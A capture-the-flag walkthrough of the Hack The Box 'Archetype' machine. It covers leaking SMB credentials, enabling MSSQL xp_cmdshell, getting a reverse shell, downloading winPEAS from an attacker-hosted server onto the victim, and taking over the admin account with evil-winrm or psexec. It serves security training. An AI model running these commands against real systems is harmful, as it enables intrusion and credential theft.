# Hack the Box - Archetype
## Overview
This is box with a Microsoft SQL server running (mssql) and smb running aswell. It does communicate with other computers on the network.

## Recon
`nmap`: ports 135 (Windows RPC), 139 (SMB), 1433 (mssql), and various other RPC ports that are used to communicate with other devices

### SMB
First goal is to see what shares are available to the anonymous user: 
</br> </br>
`smbclient -N -L \\\\<IP>` : Will list out the Shares that can be seen without logging in (-N is for no login and -L is to list them out). All admin shares end with `$`
</br></br>
We can see two created shares, `ADMIN$` and `backups`, and `backups` reveals one prod.dtsConfig file that you can download. 
</br></br>
A prod.dtsConfig file is meant to be a configuration file for a Microsoft SQL server and in this specific file, we see that there is login information for the mssql server that we can use to get into the server

### Microsoft SQL Server (mssql)
Using the information found in the prod.dtsConfig file, we can login into server as that specfic user.
</br></br>


## Exploitation
### Mssql
When you find a mssql server, they are typically going to be less monitored. And a lot of the EventID's that show up in the SIEM will be different and could be overlooked. The first thing we check is if `xp_cmdshell` is enabled on the server. This command allows you to run powershell commands in the mssql server.
</br></br>
`xp_cmdshell 'whoami'` </br>
`go` : Note that this command will run all the commands above it in the server
</br></br>
In this case, `xp_cmdshell` is disabled, however, we can try to enable it through our cli in mssql with the following command:
</br></br>
`sp_configure 'xp_cmdshell', '1'` </br>
`RECONFIGURE` </br>
`go`
</br></br>
This will allow us to now run powershell commands as sql_svc user, and we can try to get a reverse shell. To do this, I will be using `https://www.revshells.com/` to generate Base64 PowerShell commands to connect back to my computer (Make sure you have netcat running on the port that you give to revshells.com). Boom, now you can find the user flag in the user's desktop. But we want to also get the admin flag so we need privilege escalation.

## Privilege Escalation
To start this section of the pen test, we need to already have the reverse shell on the server as a basic user (sql_svc). For enumeration of privilege escalation, we are going to use winPEAS (open source git repo) but we need to actually get the script onto the victim. To do this, we are going to host a webserver with this file and have the victim download it. 
</br></br>
Start up a web server anyway you would like (usually either nginx (/var/www/html) or a python server) and place that .exe file in it. If you have a url link to a file to download, you can also just use that instead of hosting a server. Go back to the reverse shell and use `wget <IP>/<file.exe> -outfile <file.exe>` to download it on the victim (Note: you need to be in the user's Downloads folder for it to actually download). Then just run the executable and see what it ends up returning. 
</br></br>
Reading through all the output, we can see that it picked up an admin password in the `Console_history.txt` file and so now we have the credentials for the admin.

### evil-winrm
Now, we just need to connect to the server with those credentials and one way to do that is with the `evil-winrm` tool (you could also use the `psexec.py` module in `impacket`). So, just use the following command to connect to the victim: 
</br></br>
`evil-wirnm -i <IP> -u <USER or administrator>`
</br>
or
</br>
`python3 psexec.py <USER or administrator>@<IP>`
</br></br>

Next, just grab the admin flag from the Desktop and you are done